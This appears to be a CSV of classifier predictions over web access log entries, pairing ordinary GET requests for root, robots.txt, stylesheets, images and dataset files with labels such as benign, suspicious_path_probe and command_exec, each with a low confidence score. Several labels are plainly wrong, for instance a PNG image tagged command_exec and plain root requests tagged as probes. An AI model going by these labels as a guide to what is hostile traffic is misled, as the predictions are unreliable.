row_idx,text,pred_label,max_prob
604,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
605,METHOD=GET PATH=/honeypot/BSidesDFW%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.43538182973861694
606,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
607,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
608,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
609,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
610,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
611,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
612,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
613,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
614,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
615,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
616,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
617,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
618,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
619,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
620,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
621,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
622,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
623,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
624,METHOD=GET PATH=/ftp://download.iwlab.foi.se/dataset/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4131101369857788
625,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
626,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
627,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
628,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
629,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
630,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
631,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
632,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
633,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
634,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
635,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
636,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
637,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
638,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
639,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
640,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.5829781293869019
641,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
642,METHOD=GET PATH=/e/data/js/ajax.js QUERY= PROTOCOL=HTTP/1.1,benign,0.35840076208114624
643,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
